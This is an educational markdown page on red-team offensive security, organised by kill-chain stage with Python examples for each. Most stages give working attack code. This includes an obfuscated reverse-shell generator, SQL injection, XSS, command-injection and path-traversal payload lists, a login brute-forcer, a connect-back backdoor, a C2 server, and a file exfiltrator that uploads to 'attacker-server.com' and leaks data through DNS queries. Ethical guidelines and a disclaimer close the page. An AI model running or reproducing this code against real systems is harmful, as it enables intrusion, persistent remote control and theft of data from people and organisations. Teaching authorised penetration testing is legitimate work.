# Red Team - Offensive Security

Red Team refers to the offensive side of cybersecurity. Red team professionals simulate real-world attacks to test an organization's security defenses, identify vulnerabilities, and help improve overall security posture. They think like attackers to find weaknesses before malicious actors do.

## Core Responsibilities

### 1. Penetration Testing
Authorized simulated attacks to identify security weaknesses.

### 2. Social Engineering
Testing human vulnerabilities through phishing, pretexting, and other techniques.

### 3. Vulnerability Assessment
Identifying and exploiting security flaws in systems and applications.

### 4. Security Research
Discovering new attack vectors and exploitation techniques.

### 5. Reporting & Remediation Guidance
Documenting findings and providing actionable recommendations.

## Attack Lifecycle (Cyber Kill Chain)

### 1. Reconnaissance
Gathering information about the target.

**Example: Information Gathering Script**

```python
import socket
import whois
import dns.resolver
import requests
from bs4 import BeautifulSoup

class Reconnaissance:
    def __init__(self, target):
        self.target = target
        self.results = {}
    
    def dns_lookup(self):
        """Perform DNS lookups"""
        try:
            ip = socket.gethostbyname(self.target)
            self.results['ip_address'] = ip
            print(f"[+] IP Address: {ip}")
        except Exception as e:
            print(f"[-] DNS lookup failed: {e}")
    
    def whois_lookup(self):
        """Get WHOIS information"""
        try:
            w = whois.whois(self.target)
            self.results['whois'] = {
                'registrar': w.registrar,
                'creation_date': w.creation_date,
                'expiration_date': w.expiration_date,
                'name_servers': w.name_servers
            }
            print(f"[+] Registrar: {w.registrar}")
            print(f"[+] Name Servers: {w.name_servers}")
        except Exception as e:
            print(f"[-] WHOIS lookup failed: {e}")
    
    def subdomain_enumeration(self):
        """Find subdomains"""
        subdomains = ['www', 'mail', 'ftp', 'admin', 'test', 'dev', 'api']
        found_subdomains = []
        
        for sub in subdomains:
            try:
                full_domain = f"{sub}.{self.target}"
                socket.gethostbyname(full_domain)
                found_subdomains.append(full_domain)
                print(f"[+] Found subdomain: {full_domain}")
            except:
                pass
        
        self.results['subdomains'] = found_subdomains
    
    def port_scan(self, ports=[80, 443, 22, 21, 25, 3306, 8080]):
        """Scan common ports"""
        open_ports = []
        
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((self.target, port))
            
            if result == 0:
                open_ports.append(port)
                print(f"[+] Port {port} is open")
            sock.close()
        
        self.results['open_ports'] = open_ports
    
    def web_scraping(self):
        """Extract information from website"""
        try:
            response = requests.get(f"http://{self.target}", timeout=5)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract emails
            emails = set()
            for link in soup.find_all('a', href=True):
                if 'mailto:' in link['href']:
                    emails.add(link['href'].replace('mailto:', ''))
            
            # Extract technologies
            technologies = []
            if soup.find('meta', {'name': 'generator'}):
                technologies.append(soup.find('meta', {'name': 'generator'})['content'])
            
            self.results['emails'] = list(emails)
            self.results['technologies'] = technologies
            
            print(f"[+] Found {len(emails)} email addresses")
            print(f"[+] Technologies: {technologies}")
        except Exception as e:
            print(f"[-] Web scraping failed: {e}")
    
    def run_recon(self):
        """Run all reconnaissance techniques"""
        print(f"\n[*] Starting reconnaissance on {self.target}\n")
        self.dns_lookup()
        self.whois_lookup()
        self.subdomain_enumeration()
        self.port_scan()
        self.web_scraping()
        return self.results

# Usage
# recon = Reconnaissance("example.com")
# results = recon.run_recon()
```

### 2. Weaponization
Creating or obtaining exploit tools.

**Example: Simple Payload Generator**

```python
import base64

class PayloadGenerator:
    def __init__(self):
        self.payloads = []
    
    def generate_reverse_shell(self, attacker_ip, port):
        """Generate reverse shell payload"""
        # Python reverse shell
        payload = f"""
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{attacker_ip}",{port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
"""
        encoded = base64.b64encode(payload.encode()).decode()
        return f"python -c 'import base64;exec(base64.b64decode(\"{encoded}\"))'"
    
    def generate_sql_injection_payloads(self):
        """Generate SQL injection payloads"""
        return [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "' UNION SELECT NULL--",
            "' UNION SELECT username, password FROM users--"
        ]
    
    def generate_xss_payloads(self):
        """Generate XSS payloads"""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'>"
        ]
    
    def obfuscate_payload(self, payload):
        """Obfuscate payload to evade detection"""
        # Base64 encoding
        encoded = base64.b64encode(payload.encode()).decode()
        return f"eval(atob('{encoded}'))"

# Usage
# gen = PayloadGenerator()
# shell = gen.generate_reverse_shell("192.168.1.100", 4444)
# print(shell)
```

### 3. Delivery
Transmitting the weapon to the target.

**Example: Phishing Email Simulator**

```python
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

class PhishingSimulator:
    def __init__(self, smtp_server, smtp_port, username, password):
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.username = username
        self.password = password
    
    def create_phishing_email(self, target_email, template='password_reset'):
        """Create phishing email"""
        templates = {
            'password_reset': {
                'subject': 'Urgent: Password Reset Required',
                'body': '''
Dear User,

We have detected unusual activity on your account. For security reasons,
you must reset your password immediately.

Click here to reset: http://phishing-test.local/reset

This link will expire in 24 hours.

Best regards,
IT Security Team
                '''
            },
            'invoice': {
                'subject': 'Invoice #12345 - Payment Required',
                'body': '''
Dear Customer,

Please find attached invoice #12345 for your recent purchase.

View Invoice: http://phishing-test.local/invoice

Payment is due within 7 days.

Regards,
Accounting Department
                '''
            }
        }
        
        msg = MIMEMultipart()
        msg['From'] = self.username
        msg['To'] = target_email
        msg['Subject'] = templates[template]['subject']
        
        body = templates[template]['body']
        msg.attach(MIMEText(body, 'plain'))
        
        return msg
    
    def send_test_email(self, target_email, template='password_reset'):
        """Send phishing test email"""
        try:
            msg = self.create_phishing_email(target_email, template)
            
            server = smtplib.SMTP(self.smtp_server, self.smtp_port)
            server.starttls()
            server.login(self.username, self.password)
            
            server.send_message(msg)
            server.quit()
            
            print(f"[+] Phishing email sent to {target_email}")
            return True
        except Exception as e:
            print(f"[-] Failed to send email: {e}")
            return False
    
    def track_clicks(self, user_id):
        """Track if user clicked phishing link"""
        # This would be implemented with a web server
        # that logs when the phishing link is accessed
        pass

# Usage (for authorized testing only!)
# simulator = PhishingSimulator('smtp.example.com', 587, 'test@example.com', 'password')
# simulator.send_test_email('target@example.com', 'password_reset')
```

### 4. Exploitation
Exploiting vulnerabilities to gain access.

**Example: Web Application Exploit**

```python
import requests
from urllib.parse import urljoin

class WebExploiter:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
    
    def test_sql_injection(self, param='id'):
        """Test for SQL injection vulnerability"""
        payloads = [
            "1' OR '1'='1",
            "1' UNION SELECT NULL,NULL,NULL--",
            "1' AND 1=2 UNION SELECT username,password,NULL FROM users--"
        ]
        
        for payload in payloads:
            url = f"{self.target_url}?{param}={payload}"
            try:
                response = self.session.get(url, timeout=5)
                
                # Check for SQL errors or successful injection
                sql_indicators = [
                    'SQL syntax',
                    'mysql_fetch',
                    'ORA-',
                    'PostgreSQL',
                    'SQLite'
                ]
                
                for indicator in sql_indicators:
                    if indicator.lower() in response.text.lower():
                        print(f"[+] SQL Injection found with payload: {payload}")
                        return True
                
                # Check for successful data extraction
                if len(response.text) > 1000:  # Arbitrary threshold
                    print(f"[+] Possible data extraction with: {payload}")
            except Exception as e:
                print(f"[-] Error testing payload: {e}")
        
        return False
    
    def test_command_injection(self, param='cmd'):
        """Test for command injection"""
        payloads = [
            "; ls -la",
            "| whoami",
            "`id`",
            "$(cat /etc/passwd)"
        ]
        
        for payload in payloads:
            url = f"{self.target_url}?{param}={payload}"
            try:
                response = self.session.get(url, timeout=5)
                
                # Check for command output
                indicators = ['root:', 'uid=', 'total']
                
                for indicator in indicators:
                    if indicator in response.text:
                        print(f"[+] Command injection found: {payload}")
                        return True
            except Exception as e:
                pass
        
        return False
    
    def test_file_inclusion(self):
        """Test for Local File Inclusion (LFI)"""
        payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd"
        ]
        
        for payload in payloads:
            url = f"{self.target_url}?file={payload}"
            try:
                response = self.session.get(url, timeout=5)
                
                if 'root:' in response.text or 'localhost' in response.text:
                    print(f"[+] LFI vulnerability found: {payload}")
                    return True
            except Exception as e:
                pass
        
        return False
    
    def brute_force_login(self, login_url, username_list, password_list):
        """Brute force login credentials"""
        for username in username_list:
            for password in password_list:
                data = {
                    'username': username,
                    'password': password
                }
                
                try:
                    response = self.session.post(login_url, data=data, timeout=5)
                    
                    # Check for successful login
                    if 'dashboard' in response.url or 'welcome' in response.text.lower():
                        print(f"[+] Valid credentials found: {username}:{password}")
                        return (username, password)
                except Exception as e:
                    pass
        
        return None

# Usage (for authorized testing only!)
# exploiter = WebExploiter("http://vulnerable-site.local")
# exploiter.test_sql_injection()
# exploiter.test_command_injection()
```

### 5. Installation
Installing backdoors or maintaining access.

**Example: Simple Backdoor**

```python
import socket
import subprocess
import os

class Backdoor:
    def __init__(self, host, port):
        self.host = host
        self.port = port
    
    def connect(self):
        """Connect back to attacker"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.host, self.port))
            print(f"[+] Connected to {self.host}:{self.port}")
            return True
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False
    
    def execute_command(self, command):
        """Execute system command"""
        try:
            output = subprocess.check_output(
                command,
                shell=True,
                stderr=subprocess.STDOUT
            )
            return output.decode()
        except Exception as e:
            return f"Error: {str(e)}"
    
    def run(self):
        """Main backdoor loop"""
        if not self.connect():
            return
        
        while True:
            try:
                # Receive command
                command = self.sock.recv(1024).decode().strip()
                
                if command.lower() == 'exit':
                    break
                
                # Execute and send result
                result = self.execute_command(command)
                self.sock.send(result.encode())
            except Exception as e:
                break
        
        self.sock.close()

# Note: This is for educational purposes only!
# Never use this on systems without authorization
```

### 6. Command & Control (C2)
Maintaining communication with compromised systems.

**Example: Simple C2 Server**

```python
import socket
import threading

class C2Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.clients = []
    
    def handle_client(self, client_socket, address):
        """Handle individual client connection"""
        print(f"[+] New connection from {address}")
        self.clients.append(client_socket)
        
        while True:
            try:
                # Send command
                command = input(f"Shell@{address}> ")
                client_socket.send(command.encode())
                
                if command.lower() == 'exit':
                    break
                
                # Receive output
                output = client_socket.recv(4096).decode()
                print(output)
            except Exception as e:
                print(f"[-] Error: {e}")
                break
        
        client_socket.close()
        self.clients.remove(client_socket)
    
    def start(self):
        """Start C2 server"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((self.host, self.port))
        server.listen(5)
        
        print(f"[*] C2 Server listening on {self.host}:{self.port}")
        
        while True:
            client_socket, address = server.accept()
            client_thread = threading.Thread(
                target=self.handle_client,
                args=(client_socket, address)
            )
            client_thread.start()

# Usage (for authorized testing only!)
# c2 = C2Server()
# c2.start()
```

### 7. Actions on Objectives
Achieving the attack goals (data exfiltration, etc.).

**Example: Data Exfiltration**

```python
import os
import zipfile
import base64
import requests

class DataExfiltrator:
    def __init__(self, exfil_server):
        self.exfil_server = exfil_server
    
    def find_sensitive_files(self, directory, extensions=['.txt', '.pdf', '.docx', '.xlsx']):
        """Find potentially sensitive files"""
        sensitive_files = []
        
        for root, dirs, files in os.walk(directory):
            for file in files:
                if any(file.endswith(ext) for ext in extensions):
                    full_path = os.path.join(root, file)
                    sensitive_files.append(full_path)
        
        return sensitive_files
    
    def compress_files(self, files, output_zip='data.zip'):
        """Compress files for exfiltration"""
        with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for file in files:
                try:
                    zipf.write(file, os.path.basename(file))
                except Exception as e:
                    print(f"[-] Error adding {file}: {e}")
        
        return output_zip
    
    def exfiltrate_http(self, file_path):
        """Exfiltrate data via HTTP"""
        try:
            with open(file_path, 'rb') as f:
                files = {'file': f}
                response = requests.post(
                    f"{self.exfil_server}/upload",
                    files=files,
                    timeout=30
                )
                
                if response.status_code == 200:
                    print(f"[+] Successfully exfiltrated {file_path}")
                    return True
        except Exception as e:
            print(f"[-] Exfiltration failed: {e}")
        
        return False
    
    def exfiltrate_dns(self, data):
        """Exfiltrate data via DNS queries (covert channel)"""
        # Encode data in DNS queries
        encoded = base64.b64encode(data.encode()).decode()
        chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
        
        for i, chunk in enumerate(chunks):
            domain = f"{chunk}.{i}.exfil.attacker.com"
            try:
                socket.gethostbyname(domain)
            except:
                pass  # DNS query was made, that's what matters

# Usage (for authorized testing only!)
# exfil = DataExfiltrator("http://attacker-server.com")
# files = exfil.find_sensitive_files("/home/user/documents")
# zip_file = exfil.compress_files(files)
# exfil.exfiltrate_http(zip_file)
```

## Red Team Tools

### 1. Reconnaissance
- **Nmap**: Network scanner
- **Recon-ng**: Web reconnaissance framework
- **theHarvester**: Email and subdomain gathering
- **Shodan**: Internet-connected device search engine
- **Maltego**: Link analysis and data mining

### 2. Exploitation
- **Metasploit**: Exploitation framework
- **Burp Suite**: Web application testing
- **SQLmap**: SQL injection tool
- **BeEF**: Browser exploitation framework
- **Empire**: Post-exploitation framework

### 3. Password Attacks
- **John the Ripper**: Password cracker
- **Hashcat**: Advanced password recovery
- **Hydra**: Network login cracker
- **Mimikatz**: Windows credential extraction
- **CrackMapExec**: Network authentication testing

### 4. Wireless Attacks
- **Aircrack-ng**: WiFi security testing
- **Kismet**: Wireless network detector
- **Wifite**: Automated wireless attack tool
- **Reaver**: WPS attack tool

### 5. Social Engineering
- **SET (Social Engineering Toolkit)**: Phishing and social engineering
- **Gophish**: Phishing campaign framework
- **King Phisher**: Phishing campaign toolkit

## Reporting

**Example: Vulnerability Report Template**

```python
class VulnerabilityReport:
    def __init__(self):
        self.findings = []
    
    def add_finding(self, title, severity, description, impact, remediation, cvss_score=None):
        """Add vulnerability finding"""
        finding = {
            'title': title,
            'severity': severity,
            'cvss_score': cvss_score,
            'description': description,
            'impact': impact,
            'remediation': remediation,
            'evidence': []
        }
        self.findings.append(finding)
    
    def generate_report(self):
        """Generate vulnerability report"""
        report = "="*70 + "\n"
        report += "RED TEAM ASSESSMENT REPORT\n"
        report += "="*70 + "\n\n"
        
        # Executive Summary
        critical = sum(1 for f in self.findings if f['severity'] == 'CRITICAL')
        high = sum(1 for f in self.findings if f['severity'] == 'HIGH')
        medium = sum(1 for f in self.findings if f['severity'] == 'MEDIUM')
        low = sum(1 for f in self.findings if f['severity'] == 'LOW')
        
        report += "EXECUTIVE SUMMARY\n"
        report += f"Total Findings: {len(self.findings)}\n"
        report += f"  Critical: {critical}\n"
        report += f"  High: {high}\n"
        report += f"  Medium: {medium}\n"
        report += f"  Low: {low}\n\n"
        
        # Detailed Findings
        report += "DETAILED FINDINGS\n"
        report += "="*70 + "\n\n"
        
        for i, finding in enumerate(self.findings, 1):
            report += f"{i}. {finding['title']}\n"
            report += f"   Severity: {finding['severity']}\n"
            if finding['cvss_score']:
                report += f"   CVSS Score: {finding['cvss_score']}\n"
            report += f"\n   Description:\n   {finding['description']}\n"
            report += f"\n   Impact:\n   {finding['impact']}\n"
            report += f"\n   Remediation:\n   {finding['remediation']}\n"
            report += "\n" + "-"*70 + "\n\n"
        
        return report

# Usage
# report = VulnerabilityReport()
# report.add_finding(
#     title="SQL Injection in Login Form",
#     severity="CRITICAL",
#     cvss_score=9.8,
#     description="The login form is vulnerable to SQL injection...",
#     impact="Attacker can bypass authentication and access database...",
#     remediation="Use parameterized queries and input validation..."
# )
# print(report.generate_report())
```

## Ethical Guidelines

1. **Always Get Written Authorization**: Never test without explicit permission
2. **Define Scope Clearly**: Know what's in and out of scope
3. **Minimize Impact**: Avoid disrupting business operations
4. **Protect Data**: Handle discovered data responsibly
5. **Report Responsibly**: Disclose findings to the right people
6. **Follow Laws**: Comply with all applicable laws and regulations
7. **Maintain Confidentiality**: Keep findings confidential
8. **Document Everything**: Maintain detailed records of activities

## Career Path

- **Junior Penetration Tester**: Entry-level security testing
- **Penetration Tester**: Conduct security assessments
- **Senior Penetration Tester**: Lead complex engagements
- **Red Team Operator**: Advanced adversary simulation
- **Red Team Lead**: Manage red team operations
- **Security Researcher**: Discover new vulnerabilities
- **Bug Bounty Hunter**: Independent security researcher

## Certifications

- **CEH**: Certified Ethical Hacker
- **OSCP**: Offensive Security Certified Professional
- **GPEN**: GIAC Penetration Tester
- **GXPN**: GIAC Exploit Researcher and Advanced Penetration Tester
- **CRTP**: Certified Red Team Professional
- **PNPT**: Practical Network Penetration Tester

---

**DISCLAIMER**: All techniques and tools described here are for educational purposes and authorized security testing only. Unauthorized access to computer systems is illegal.

---

- Go back to [Cyber Security](./index.md)
- Return to [Home](../../index.md)
